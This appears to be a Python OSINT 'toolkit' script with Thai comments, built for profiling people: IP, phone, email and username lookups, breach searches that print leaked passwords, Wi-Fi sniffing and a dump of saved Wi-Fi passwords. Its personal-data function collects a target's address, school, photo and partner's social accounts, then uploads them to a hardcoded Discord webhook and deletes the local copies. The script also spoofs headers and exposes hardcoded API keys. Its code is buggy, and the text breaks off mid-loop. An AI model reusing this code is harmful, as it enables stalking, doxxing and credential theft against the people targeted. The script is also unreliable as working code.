
# -*- coding: utf-8 -*-


def install():
    import os
    import sys
    try:
        os.system("pip install --upgrade pip")
        os.system("pip3 install --upgrade pip")
        os.system("python.exe -m pip install --upgrade pip")
    except OSError:
        pass
    try:
        os.system("python3 -m pip install --upgrade pip")
    except:
        pass
    try:
        os.system("python -m pip install --upgrade pip")
    except:
        pass
    try:
        os.system("pip install requests")
        print("---------------------------\nInstall requests successfully.\n")
    except ImportError:
        pass
    try:
        os.system("pip install concurrent.futures")
        print("---------------------------\nInstall concurrent.futures successfully.\n")
    except ImportError:      
        pass
    try:
        os.system("pip install colorama")
        print("---------------------------\nInstall colorama successfully.\n")
    except ImportError:
        pass
    try:
        os.system("pip install exifread")
        print("---------------------------\nInstall exifread successfully.\n")
    except ImportError:
        pass
    try:
        os.system("pip install psutil")
        print("---------------------------\nInstall psutil successfully.\n")
    except ImportError:
        pass
    try:
        os.system("pip install beautifulsoup4")
        print("---------------------------\nInstall bs4 successfully.\n")
    except:
        pass
    try:
        os.system("pip3 install beautifulsoup4")
        print("---------------------------\nInstall bs4 successfully.\n")
    except:
        pass
    try:
        os.system("pip install hashlib")
        print("---------------------------\nInstall hashlib successfully.\n")
    except:
        pass

def tor_vpn():
    print(Style.BRIGHT + Fore.YELLOW + """
          
    [*] Please install Tor: https://www.torproject.org/download/
    [*] Then install a VPN (e.g., ProtonVPN): https://protonvpn.com/
    [!] Tor and VPN are required for anonymity and security when using certain tools.

    """ + Style.RESET_ALL)

def banner_for_install():
    print("""
          INSTALL FIRST      Version 7
                         _Y_
                       ( o o )
       ____________oOO___(_)___OOo______
      /                                /
     /     RAVEN PROTOCOL ACTIVE      /
    /   Watching. Waiting. Listening /
   /          By. Potter            /
  /________________________________/
          
          """)
    
def banner():
    print(Style.BRIGHT + Fore.GREEN +"""             
                         _Y_
                       ( o o )
       ____________oOO___(_)___OOo______
      /                                /
     /     RAVEN PROTOCOL ACTIVE      /
    /   Watching. Waiting. Listening /
   /          By. Potter            /
  /________________________________/ Version 7
          
          """+ Style.RESET_ALL)

def function_lists():
    print("================================ MENU =================================")
    print(Style.BRIGHT + Fore.BLUE + "                               TOOLsKIT " + Style.RESET_ALL)
    print("=======================================================================")
    print("""
    
    IP Information:
    [1] - IP Geolocation          # Find the location of an IP address
    [4] - Reverse IP Lookup       # Find domains associated with an IP address
    
    Email Information:
    [2] - Email Verification      # Check if an email is valid
    [8] - Email Lookup            # Look up details about an email address
    
    Domain Information:
    [3] - Domain Reputation       # Check the reputation of a domain
    [5] - Subdomain Lookup       # Find subdomains related to a domain
    
    Phone Information:
    [6] - Phone Number Lookup    # Look up information about a phone number
    
    Username Information:
    [7] - Username Lookup        # Search for profiles associated with a username
    
    Image Metadata:
    [9] - Metadata Extractor     # Extract metadata from images and files
    
    Contact Finder:
    [10] - ContactFinder         # Find phone numbers and emails associated with people
    
    Wifi Information:
    [11] - Wifi-Lan Lookup Tool  # Look up WiFi networks and device information
    [15] - Wi-Fi Network Sniffer  # Sniff Wi-Fi networks and capture packets
          
    Dark Web Search:
    [12] - Dark Web Search    # Search for information on the dark web
          
    File Integrity Check:
    [13] - File Integrity Check   # Check the integrity of files using hashes

    Short URL Expander:
    [14] - URL Expander           # Expand shortened URLs to their original form
          
    Random name generator:
    [16] - Random Name Generator  # Generate random names
          

    Spy Tools & Websites:
    [links] - Spy Tool Websites   # Links to useful spy tools
    [WIFI] - Wifi Lookup          # Lookup details of WiFi networks
    [Personal data records] - Personal data records
          
    =======================================================================
    """)


def exit():
    print(Fore.RED + """
        [0] - Exit
        [H] - Help
    """ + Style.RESET_ALL)

#เพิ่มฟังก์ชันสำหรับบันทึกข้อมูลส่วนบุคคล
def pdr():
    print("=== Personal Data Record System ===")
    
    # รับข้อมูลจากผู้ใช้
    name = input("Enter full name: ")
    nick_name = input("Enter nickname: ")
    age = input("Enter age: ")
    birthday = input("Enter birthday (dd/mm/yyyy): ")
    gender = input("Enter gender (ชาย/หญิง/อื่นๆ): ")
    have_gf_bf = input("Have a gf/bf/marry?: ")
    phone_number = input("Enter phone number: ")
    email = input("Enter email: ")
        
    fb_link_1 = input("Enter FB link 1: ")
    fb_link_2 = input("Enter FB link 2: ")
    ig_link_1 = input("Enter IG link 1: ")
    ig_link_2 = input("Enter IG link 2: ")

    fb_link_gf_bf_1 = input("Enter FB link of gf/bf 1: ")
    fb_link_gf_bf_2 = input("Enter FB link of gf/bf 2: ")
    ig_link_gf_bf_1 = input("Enter IG link of gf/bf 1: ")
    ig_link_gf_bf_2 = input("Enter IG link of gf/bf 2: ")
    
    address = input("Enter address ประเทศ/จังหวัด/อำเภอ/บ้าน: ")
    academy = input("Enter academy สถานศึกษา: ")
    other = input("อื่นๆ: ")
    
    log_folder = f"{name}_{nick_name}_log1"
    log_text_filename = "people_data.txt"  # เขียนไฟล์ในโฟลเดอร์
    webhook_url = "https://discord.com/api/webhooks/1371105746665607398/4Q67scPFk7zzojoRdu4Im_gVYKTw8XSHSx15TwqN4GW5yD0FnU6-YLQM-1us_peDHrVz"

    image_file_input = input("Do you have an image of this person? (yes/no): ")

# สร้างโฟลเดอร์
    os.makedirs(log_folder, exist_ok=True)

    # ถ้ามีรูปภาพ
    if image_file_input.lower() == "yes":
        image_file_path = input("Enter the full path to the image file (e.g. H:/Pictures/person.jpg): ")
        image_file_name = os.path.basename(image_file_path)
        
        if os.path.exists(image_file_path):
            shutil.copy(image_file_path, os.path.join(log_folder, image_file_name))
            print(Style.BRIGHT + Fore.GREEN + "Image copied to log folder." + Style.RESET_ALL)
        else:
            print(Style.BRIGHT + Fore.RED + "Image file not found." + Style.RESET_ALL)
            return

    # เขียนไฟล์ข้อมูล .txt
    with open(os.path.join(log_folder, log_text_filename), "w", encoding="utf-8") as f:
        now = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
        f.write(f"""{now}
---------------------------
Name: {name}
Nickname: {nick_name}
Age: {age}
Gender: {gender}
Brithday: {birthday}
Have a gf/bf/marry: {have_gf_bf}
Phone Number: {phone_number}
Email: {email}
----------------------------
!url of this person!
link FB_1: {fb_link_1}
Link FB_2: {fb_link_2}
Link IG_1: {ig_link_1}
Link IG_2: {ig_link_2}
----------------------------
!url of gf/bf!
Link FB gf/bf_1: {fb_link_gf_bf_1}
Link FB gf/bf_2: {fb_link_gf_bf_2}
Link IG gf/bf_1: {ig_link_gf_bf_1}
Link IG gf/bf_2: {ig_link_gf_bf_2}
----------------------------
Address: {address}
Academy: {academy}
Other: {other}
""")

    # สร้าง ZIP
    zip_filename = f"{log_folder}_{now}.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        for root, dirs, files in os.walk(log_folder):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, log_folder)
                zipf.write(file_path, arcname)

    # ส่ง ZIP ไป Discord
    with open(zip_filename, 'rb') as f:
        response = requests.post(
            webhook_url,
            files={'file': (zip_filename, f)},
            data={"content": f"📦 Data of {name} uploaded."}
        )

    if response.status_code == 200:
        print(Style.BRIGHT + Fore.GREEN + "Upload success!" + Style.RESET_ALL)
        shutil.rmtree(log_folder)
        print(Style.BRIGHT + Fore.BLUE + "Folder deleted after upload." + Style.RESET_ALL)
        os.remove(image_file_path)
        print(Style.BRIGHT + Fore.MAGENTA + "Image deleted after upload." + Style.RESET_ALL)
        # 🔥 ลบไฟล์ zip ด้วย
        if os.path.exists(zip_filename):
            os.remove(zip_filename)
            print(Style.BRIGHT + Fore.CYAN + "Zip file deleted." + Style.RESET_ALL)
    else:
        print(Style.BRIGHT + Fore.RED + "Upload failed:", response.status_code, response.text + Style.RESET_ALL)
    

#IPinfo.io
def get_ip_info(ip_address):
    url = f"https://ipinfo.io/{ip_address}/json"
    response = requests.get(url)
    data = response.json()
    
    return data

def get_ip_info_whoixml(ip_address):
    url = f"https://ip-geolocation.whoisxmlapi.com/api/v1?apiKey=at_2HJU294oEIupFFWLVBJAP4fnYPYmk&ipAddress={ip_address}"
    response = requests.get(url)
    data = response.json()
    
    return data

def get_ip_info_ip_api(ip_address):
    url = f"http://ip-api.com/json/{ip_address}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        return None
    
def get_ip_info(ip):
    api_key = "f7969b818f571b7b4b6a8745570d9986"
    url = f"http://api.ipstack.com/{ip}?access_key={api_key}"
    response = requests.get(url)
    if response.status_code == 200:
        return response.json()
    else:
        return None
    

def email_verification(email):
    url = f"https://emailverification.whoisxmlapi.com/api/v3?apiKey=at_2HJU294oEIupFFWLVBJAP4fnYPYmk&emailAddress=support@whoisxmlapi.com"
    response = requests.get(url)
    data = response.json()
    
    return data

def domain_reputation(domain):
    url = f"https://domain-reputation.whoisxmlapi.com/api/v2?apiKey=at_2HJU294oEIupFFWLVBJAP4fnYPYmk&domainName={domain}"
    response = requests.get(url)
    data = response.json()

    return data


def reverse_ip_lookup(ip_address):
    # URL ของ API
    url = "https://reverse-ip.whoisxmlapi.com/api/v1"
    
    # ส่งคำขอไปยัง API
    response = requests.get(url, params={
        "apiKey": "at_2HJU294oEIupFFWLVBJAP4fnYPYmk",
        "ip": ip_address
    })
    
    # ตรวจสอบสถานะของคำขอ
    if response.status_code == 200:
        data = response.json()
        
        # ตรวจสอบว่า 'result' อยู่ในข้อมูลหรือไม่
        if 'result' in data:
            return data['result']  # ส่งกลับข้อมูลที่อยู่ใน result
        else:
            print("ไม่พบข้อมูลในผลลัพธ์.")
            return None
    else:
        print(f"เกิดข้อผิดพลาดในการเรียก API, Status Code: {response.status_code}")
        return None

def subdomain_lookup(domain):
    response = requests.get(
        f"https://subdomains.whoisxmlapi.com/api/v1?apiKey=YOUR_API_KEY&domainName={domain}"
    )
    data = response.json()
    
    records = data.get('result', {}).get('records', [])
    if not records:
        print("ไม่พบ subdomains สำหรับโดเมนนี้")
    
    return data  # ✅ return ทั้ง JSON

def phone_number_lookup_apilayer(phone_number):
    api_key = 'de907b2d10edc906236208b64b7d0378'
    phone_number = f'{phone_number}'  # ใส่เบอร์แบบรวมรหัสประเทศ
    url = f'http://apilayer.net/api/validate?access_key={api_key}&number={phone_number}'

    response = requests.get(url)
    data = response.json()

    print(f"""\nData from > apilayer.net
Valid: {data['valid']}
Number: {data['number']}
Local Format: {data['local_format']}
International Format: {data['international_format']}
Country: {data['country_name']}
Location: {data['location']}
Carrier: {data['carrier']}
Line Type: {data['line_type']}
    """)

def phone_number_lookup_abstractAPI(phone_number):
    # ทำการเรียก API จาก Abstract API
    response = requests.get(f"https://phonevalidation.abstractapi.com/v1/?api_key=afe0e3e3c4d646e99d7114d147e287d9&phone={phone_number}")
    
    # ตรวจสอบว่า response ได้รับข้อมูลมาหรือไม่
    if response.status_code == 200:
        # แปลง response ให้เป็น json
        data = response.json()
        
        # แสดงผลข้อมูลที่ได้จาก API
        print(f"""Data from > abstractapi.com
Phone Number: {data['phone']}
Valid: {data['valid']}
International Format: {data['format']['international']}
Local Format: {data['format']['local']}

Country: {data['country']['name']} ({data['country']['code']})
Country Prefix: {data['country']['prefix']}
Location: {data['location']}

Line Type: {data['type']}
Carrier: {data['carrier']}
        """)
    else:
        print(f"Error: Unable to retrieve information for phone number {phone_number}")

#Check username =======================================================================
def is_valid_username(username):
    # อนุญาตเฉพาะ a-z A-Z 0-9 _ - .
    return all(c.isalnum() or c in ['_', '-', '.', ' '] for c in username)

sites = {
    "\n---------------------------\n"
    "AngelList": "https://angel.co/u/{}",
    "Ask": "https://www.ask.com/web?q={}",
    "Behance": "https://www.behance.net/{}",
    "Badoo": "https://badoo.com/en/{}",
    "Bing": "https://www.bing.com/search?q={} ",
    "Box Office Mojo": "https://www.boxofficemojo.com/{}",
    "Chaturbate": "https://chaturbate.com/{}",
    "Clubhouse": "https://www.joinclubhouse.com/@{}",
    "Crunchbase": "https://www.crunchbase.com/person/{}",
    "Dailymotion": "https://www.dailymotion.com/{}",
    "DeviantArt": "https://www.deviantart.com/{}",
    "Disney+": "https://www.disneyplus.com/{}",
    "Dribbble": "https://dribbble.com/{}",
    "DuckDuckGo": "https://duckduckgo.com/?q={}",
    "Eventbrite": "https://www.eventbrite.com/d/online/{}",
    "Facebook": "https://www.facebook.com/{}",
    "Fandango": "https://www.fandango.com/{}",
    "Fiverr": "https://www.fiverr.com/{}",
    "Flickr": "https://www.flickr.com/photos/{}",
    "Freelancer": "https://www.freelancer.com/u/{}",
    "GitHub": "https://github.com/{}",
    "GitLab": "https://gitlab.com/{}",
    "Glassdoor": "https://www.glassdoor.com/Overview/Working-at-{}",
    "Grindr": "https://grindr.com/{}",
    "Hulu": "https://www.hulu.com/users/{}",
    "Indeed": "https://www.indeed.com/cmp/{}",
    "Instagram": "https://www.instagram.com/{}",
    "IMDb": "https://www.imdb.com/user/{}",
    "LinkedIn": "https://www.linkedin.com/in/{}",
    "LiveCamModels": "https://www.livecammodels.com/{}",
    "LiveJasmin": "https://www.livejasmin.com/en/chat/{}",
    "Match": "https://www.match.com/profile/{}",
    "MeWe": "https://mewe.com/i/{}",
    "Medium": "https://medium.com/@{}",
    "Mix": "https://mix.com/{}",
    "MyFreeCams": "https://www.myfreecams.com/{}",
    "MySpace": "https://myspace.com/{}",
    "Netflix": "https://www.netflix.com/profiles/{}",
    "OkCupid": "https://www.okcupid.com/profile/{}",
    "OnlyFans": "https://onlyfans.com/{}",
    "Periscope": "https://www.pscp.tv/{}",
    "Patreon": "https://www.patreon.com/{}",
    "Pinterest": "https://www.pinterest.com/{}",
    "PlentyOfFish": "https://www.pof.com/profile/{}",
    "ProductHunt": "https://www.producthunt.com/@{}",
    "Quora": "https://www.quora.com/profile/{}",
    "Reddit": "https://www.reddit.com/user/{}",
    "Redbubble": "https://www.redbubble.com/people/{}",
    "Rotten Tomatoes": "https://www.rottentomatoes.com/user/{}",
    "SoundCloud": "https://soundcloud.com/{}",
    "Spotify": "https://open.spotify.com/user/{}",
    "StackOverflow": "https://stackoverflow.com/users/{}",
    "Skype": "https://www.skype.com/{}",
    "Snapchat": "https://www.snapchat.com/add/{}",
    "Tango": "https://www.tango.me/{}",
    "TikTok": "https://www.tiktok.com/@{}",
    "Trakt": "https://trakt.tv/users/{}",
    "Tribe": "https://www.tribe.com/{}",
    "Tumblr": "https://{}.tumblr.com/",
    "Twitch": "https://www.twitch.tv/{}",
    "Twitter": "https://twitter.com/{}",
    "Vimeo": "https://vimeo.com/{}",
    "Viber": "https://www.viber.com/{}",
    "Vkontakte": "https://vk.com/{}",
    "WeChat": "https://mp.weixin.qq.com/{}",
    "Weibo": "https://weibo.com/{}",
    "Wikipedia": "https://en.wikipedia.org/wiki/User:{}",
    "WhatsApp": "https://wa.me/{}",
    "XHamsterLive": "https://www.xhamsterlive.com/{}",
    "Xing": "https://www.xing.com/profile/{}",
    "YouNow": "https://www.younow.com/{}",
    "YouTube": "https://www.youtube.com/c/{}",
    "Yandex": "https://yandex.com/search/?text={}",
    "Zoosk": "https://www.zoosk.com/profile/{}",
}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9,th;q=0.8",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Referer": "https://www.google.com/",
    "TE": "Trailers",
    "X-Requested-With": "XMLHttpRequest",  # ใช้ในกรณี AJAX requests
    "DNT": "1",  # Do Not Track header
    "Pragma": "no-cache",
    "If-None-Match": '"e0023aa4c04b2483f5f6a8f6d9e83255"',
    "X-Forwarded-For": "203.0.113.195"  # ใช้สำหรับการ spoofing IP (จำลองการใช้งานจาก IP อื่น)
}


def check_username(site, url_pattern, username):
    url = url_pattern.format(username)
    try:
        response = requests.get(url, headers=headers, timeout=5)
        if response.status_code == 200:
            return f"{site}: {Style.BRIGHT + Fore.GREEN + 'Username found → ' + url + Style.RESET_ALL}"
        elif response.status_code == 404:
            return f"{site}: {Fore.RED + 'Username not found (404)' + Style.RESET_ALL}"
        elif response.status_code == 400:
            return f"{site}: {Fore.YELLOW + 'Bad request (400)' + Style.RESET_ALL}"
        else:
            return f"{site}: {Fore.YELLOW + 'Response code ' + str(response.status_code) + Style.RESET_ALL}"
    except requests.exceptions.RequestException:
        return f"{site}: {Fore.RED + 'Unable to connect' + Style.RESET_ALL}"
    

# ฟังก์ชั่นตรวจหลายชื่อ
def check_multiple_usernames(usernames):
    all_results = []
    with ThreadPoolExecutor() as executor:
        futures = []
        for username in usernames:
            if not username:
                all_results.append(f"⚠️ Please enter a valid username.")
            elif not is_valid_username(username):
                all_results.append(f"❗ Invalid username, it may contain spaces or invalid characters.")
            else:
                # ตรวจสอบชื่อเดียวกับทุกเว็บไซต์
                for site, url_pattern in sites.items():
                    futures.append(executor.submit(check_username, site, url_pattern, username))

        # รอผลลัพธ์จากทุกคำขอที่ส่งไป
        for future in futures:
            result = future.result()
            # ตรวจสอบว่า result คือสตริงก่อนที่จะเพิ่มเข้าไปใน all_results
            if isinstance(result, str):
                all_results.append(result)
            else:
                # ถ้าเป็น tuple แปลงเป็น string
                all_results.append(' '.join(str(item) for item in result))  # รวมเป็นสตริง

    return all_results


def email_leak_lookup(email):
    API_KEY = "99bb292bc71fff06b8d0967df6f8094d"
    url = "https://leak-lookup.com/api/search"
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "type": "email",
        "query": email
    }

    response = requests.post(url, json=data, headers=headers)

    if response.status_code == 200:
        result = response.json()
        if result.get("success"):
            breaches = result.get("found", [])
            print(f"Leaked data found for {email}:")
            for breach in breaches:
                print(f" - Database name:: {breach['database']}")
                print(f" - Password (hash or plain): {breach.get('password', 'N/A')}")
                print("You can check hash here:https://crackstation.net/")
        else:
            print("No leaks found for this email.")
    else:
        print("Error occurred: HTTP:", response.status_code)
    print("---------------------------\n")

def dms_to_decimal(dms, ref):
    degrees = float(dms[0].num) / float(dms[0].den)
    minutes = float(dms[1].num) / float(dms[1].den)
    seconds = float(dms[2].num) / float(dms[2].den)

    decimal = degrees + (minutes / 60.0) + (seconds / 3600.0)
    if ref in ['S', 'W']:
        decimal = -decimal
    return decimal

def extract_gps(file_path):
    with open(file_path, 'rb') as f:
        tags = exifread.process_file(f)

    try:
        lat = tags["GPS GPSLatitude"]
        lat_ref = tags["GPS GPSLatitudeRef"].values
        lon = tags["GPS GPSLongitude"]
        lon_ref = tags["GPS GPSLongitudeRef"].values

        latitude = dms_to_decimal(lat.values, lat_ref)
        longitude = dms_to_decimal(lon.values, lon_ref)

        print(f"[+] GPS Coordinates:")
        print(f"    Latitude: {latitude}")
        print(f"    Longitude: {longitude}")
        print("\n[+] Google Maps Link:")
        print(f"    https://www.google.com/maps?q={latitude},{longitude}")

    except KeyError:
        print("[-] GPS metadata not found in the image.")


def find_info(text):
    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)
    phones = re.findall(r'\+?\d[\d\s\-\(\)]{8,15}', text)

    print("[*] Emails found:")
    for email in set(emails):
        print(" -", email)

    print("\n[*] Phone numbers found:")
    for phone in set(phones):
        print(" -", phone)

def scan_website(url):
    print(f"[*] Scanning {url} ...")
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            find_info(text)
        else:
            print("[-] Error: Website not accessible.")
    except Exception as e:
        print(f"[-] Error: {e}")

def search_dark_web(query):
    url = f"https://ahmia.fi/search/?q={query}"

    session = requests.Session()
    retries = Retry(
        total=3,
        backoff_factor=1,
        status_forcelist=[429, 500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount("http://", adapter)
    session.mount("https://", adapter)

    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": "https://ahmia.fi/",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1"
    })

    try:
        response = session.get(url, timeout=30)
        soup = BeautifulSoup(response.text, "html.parser")
        results = []
        for link in soup.find_all("a", href=True):
            href = link["href"]
            match = re.search(r"(http[s]?://[a-zA-Z0-9\-]{16,56}\.onion)", href)
            if match:
                onion_url = match.group(1)
                title = link.text.strip()
                results.append((title if title else "[no title]", onion_url))
        return results
    except requests.exceptions.ReadTimeout:
        print("[!] Timeout: Ahmia.fi took too long to respond.")
        return []
    except Exception as e:
        print(f"[!] Error: {e}")
        return []

def random_password(length=12):
    url = f"https://passwordwolf.com/api/?length={length}&upper=1&lower=1&numbers=1&special=1&repeat=1&count=1"
    try:
        response = requests.get(url)
        data = response.json()
        return data[0]["password"]
    except Exception as e:
        return f"[ERROR] {str(e)}"
    
def format_thai_date(iso_date_str):
    thai_months = [
        "มกราคม", "กุมภาพันธ์", "มีนาคม", "เมษายน", "พฤษภาคม", "มิถุนายน",
        "กรกฎาคม", "สิงหาคม", "กันยายน", "ตุลาคม", "พฤศจิกายน", "ธันวาคม"
    ]
    dt = datetime.fromisoformat(iso_date_str.rstrip("Z"))
    day = dt.day
    month = thai_months[dt.month - 1]
    year = dt.year + 543  # แปลงเป็น พ.ศ.
    return f"{day} {month} {year}"

    
def random_name_generator():
    url = "https://randomuser.me/api/"
    response = requests.get(url)
    data = response.json()

    user = data['results'][0]
    thai_dob = format_thai_date(user['dob']['date'])
    print(Style.BRIGHT + Fore.CYAN + "\nข้อมูลผู้ใช้แบบสุ่ม\n" + Style.RESET_ALL)

    print(" ชื่อ:", user['name']['title'], user['name']['first'], user['name']['last'])
    print(" เพศ:", user['gender'].capitalize())
    print(" วันเกิด:", user['dob']['date'])
    print(" วันเกิดวันเกิดเป็นรูปแบบไทย:", thai_dob)
    print(" อายุ:", user['dob']['age'], "ปี")

    print("\n ที่อยู่:")
    print("   - บ้านเลขที่:", user['location']['street']['number'])
    print("   - ถนน:", user['location']['street']['name'])
    print("   - เมือง:", user['location']['city'])
    print("   - รัฐ/จังหวัด:", user['location']['state'])
    print("   - ประเทศ:", user['location']['country'])
    print("   - รหัสไปรษณีย์:", user['location']['postcode'])

    print("\n เบอร์โทรศัพท์:", user['phone'])
    print(" มือถือ:", user['cell'])

    print("\n รูปภาพ:", user['picture']['large'])
    print(" สัญชาติ (รหัส):", user['nat'])

    print(Style.BRIGHT + Fore.GREEN + "\nข้อมูลทั้งหมดจาก: https://randomuser.me/api/\n" + Style.RESET_ALL)
    
    password_length = int(input("Enter password length (default is 12): "))
    password = random_password(password_length)
    print(Style.BRIGHT + Fore.CYAN + f"\npassword: " + Style.RESET_ALL + password)
    print(Style.BRIGHT + Fore.YELLOW + "ข้อมูลทั้งหมดจะถูกบันทึกลงในไฟล์" + Style.RESET_ALL)
    wanna_save = input("Do you want to save the name&password to a file? (y/n): ").strip().lower()
    if wanna_save == 'y' or wanna_save == 'yes' or wanna_save == 'Y' or wanna_save == 'Yes':
        # สร้างชื่อไฟล์ที่ไม่ซ้ำกันโดยใช้ timestamp
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        filename = f"Password_saves/password_{timestamp}.txt"
        if not os.path.exists("Password_saves"):
            os.makedirs("Password_saves")

        with open(filename, "w", encoding="utf-8") as f:
            f.write("ข้อมูลผู้ใช้แบบสุ่ม\n")
            f.write(f"ชื่อ: {user['name']['title']} {user['name']['first']} {user['name']['last']}\n")
            f.write(f"เพศ: {user['gender'].capitalize()}\n")
            f.write(f"วันเกิด: {user['dob']['date']}\n")
            f.write(f"วันเกิดวันเกิดเป็นรูปแบบไทย: {thai_dob}\n")
            f.write(f"อายุ: {user['dob']['age']} ปี\n\n")

            f.write("ที่อยู่:\n")
            f.write(f"  - บ้านเลขที่: {user['location']['street']['number']}\n")
            f.write(f"  - ถนน: {user['location']['street']['name']}\n")
            f.write(f"  - เมือง: {user['location']['city']}\n")
            f.write(f"  - รัฐ/จังหวัด: {user['location']['state']}\n")
            f.write(f"  - ประเทศ: {user['location']['country']}\n")
            f.write(f"  - รหัสไปรษณีย์: {user['location']['postcode']}\n\n")

            f.write(f"เบอร์โทรศัพท์: {user['phone']}\n")
            f.write(f"มือถือ: {user['cell']}\n")
            f.write(f"รูปภาพ: {user['picture']['large']}\n")
            f.write(f"สัญชาติ (รหัส): {user['nat']}\n\n")
        
            f.write(f"รหัสผ่านที่สุ่มได้: {password}\n")

    else:
        print(Style.BRIGHT + Fore.BLUE + "Okay.." + Style.RESET_ALL)

def check_file_integrity(file_path):
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        # Read file in chunks of 4K
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def expand_url(short_url):
    url = f"https://api.shrtco.de/v2/info?url={short_url}"
    response = requests.get(url)
    return response.json()

def sniff_wifi():
    # เริ่มการดักจับแพ็กเกจ Wi-Fi
    print("Starting Wi-Fi sniffing...")
    print("Make sure that you have wifi cade or wifi usb adapter.")
    try:
        scapy.sniff(iface="wlan0", prn=lambda x: x.summary())
    except PermissionError:
        print("Permission denied. Please run as root or use sudo.") 
    except Exception as e:
        print(f"An error occurred: {e}")
#---------------------------------------------------------------------------------

def get_saved_wifi_passwords():
    # เรียกดูโปรไฟล์ Wi-Fi ที่บันทึกไว้
    profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True, text=True)
    profiles = re.findall(r"All User Profile\s*:\s(.*)", profiles_output)

    wifi_passwords = []

    for profile in profiles:
        profile = profile.strip()
        # ดึงรายละเอียดของแต่ละโปรไฟล์
        try:
            profile_info = subprocess.check_output(
                f'netsh wlan show profile "{profile}" key=clear',
                shell=True, text=True
            )
            # หา key (password)
            password = re.search(r"Key Content\s*:\s(.*)", profile_info)
            if password:
                wifi_passwords.append((profile, password.group(1)))
            else:
                wifi_passwords.append((profile, "No password set"))
        except subprocess.CalledProcessError:
            wifi_passwords.append((profile, "Cannot access profile"))

    return wifi_passwords
#====================================================================================



#========================    Local Area Network (LAN) Info    =======================#


def get_all_network_info():
    addrs = psutil.net_if_addrs()
    try:
        for interface, addr_list in addrs.items():
            for addr in addr_list:
                if addr.family.name == 'AF_INET':  # IPv4
                    print(f"Interface: {interface} | IP: {addr.address}")
    except OSError as e:
        print(f"Error: {e}")
        time.sleep(2)

        
#====================================================================================



#========================    Main Functionality    =======================#
def wifi_lan():
    if __name__ == "__main__":
        selct = input("Do you want to see Wifi or Lan (w/l): ").strip().lower()
        print()

        # lan info
        if selct == "l":
            get_all_network_info()
            print()
            
        # wifi info
        elif selct == "w":
            passwords = get_saved_wifi_passwords()
            for wifi, password in passwords:
                print(f"Wi-Fi: {wifi} | Password: {password}")
                print()
        else:
            print("Invalid selection. Please choose 'w' for Wi-Fi or 'l' for LAN.")
    pass

def download_for_mobile():
    import time
    print("Do you install module yet?")
    while True:
        down_or_not = str(input("\nDo you want to Downloads module for the first time you run?\nY/N: "))
        if down_or_not == "Y" or down_or_not == "y":
            print("Okay.. let install")
            install()
            print("YES you install all module in my tool youre good boy")
            time.sleep(3)
            print(f"Have a good time..")
            time.sleep(5)
            break

        elif down_or_not == "N" or down_or_not == "n" or down_or_not == "No" or down_or_not == "NO":
            print("Okay..")
            time.sleep(2)
            break
                

        else:
            print("WTF is this "+ down_or_not)
            pass

def clear_terminal():
    import os
    os.system('cls' if os.name == 'nt' else 'clear')


banner_for_install()
download_for_mobile()
clear_terminal()


clear_terminal()
import os
import socket
import time
import exifread
import re
import psutil
import subprocess
import hashlib
import shutil
import zipfile
from datetime import datetime
import requests
import scapy.all as scapy
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import urllib.parse
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

init(autoreset=True)

#clear_terminal()


#=====================================================================

banner()
tor_vpn()
function_lists()
exit()

while True:
    function = input("Select Function: ")  # ใช้ IP จริงหรือ IP เป้าหมาย
    if function == "1":
        ip = input("Pubilc-IP : ")
        ip_info_ip_io = get_ip_info(ip)
        ip_info_whoisxml = get_ip_info_whoixml(ip)  # ใช้ API ของ whoisxmlapi
        ip_info_ip_api = get_ip_info(ip)
        ip_info_ip_stack = get_ip_info(ip)
        print("\nData form > ipinfo.io")
        try:
            print(f'''---------------------------
IP Information
IP       : {ip_info_ip_io['ip']}
Location : {ip_info_ip_io['city']}, {ip_info_ip_io['country']}
Org      : {ip_info_ip_io['org']}
Hostname : {ip_info_ip_io['hostname']}
            ''')
        except Exception as e:
            print(f"Error: {e}")
            pass

        #location = ip_info_whoisxml['country'][0]
        #warning = test_result['warnings'][0]
        print("\nData form > whoisxmlapi.com")
        try:
            print(f'''---------------------------   
IP Address      : {ip_info_whoisxml['ip']}
ISP             : {ip_info_whoisxml['isp']}
Connection Type : {ip_info_whoisxml['connectionType']}

Location:
  Country        : {ip_info_whoisxml['location']['country']}
  Region         : {ip_info_whoisxml['location']['region']}
  City           : {ip_info_whoisxml['location']['city']}
  Latitude       : {ip_info_whoisxml['location']['lat']}
  Longitude      : {ip_info_whoisxml['location']['lng']}
  Timezone       : {ip_info_whoisxml['location']['timezone']}
  Geoname ID     : {ip_info_whoisxml['location']['geonameId']}

AS Information:
  ASN            : {ip_info_whoisxml['as']['asn']}
  Name           : {ip_info_whoisxml['as']['name']}
  Route          : {ip_info_whoisxml['as']['route']}
            ''')
